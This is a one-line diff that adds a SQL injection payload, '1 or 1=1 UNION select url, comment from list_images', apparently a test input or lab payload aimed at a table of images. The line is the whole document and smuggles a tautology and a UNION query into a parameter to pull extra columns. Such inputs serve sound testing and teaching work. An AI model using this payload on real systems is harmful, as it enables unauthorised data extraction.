@@ -1,0 +1,1 @@
+1 or 1=1 UNION select url, comment from list_images
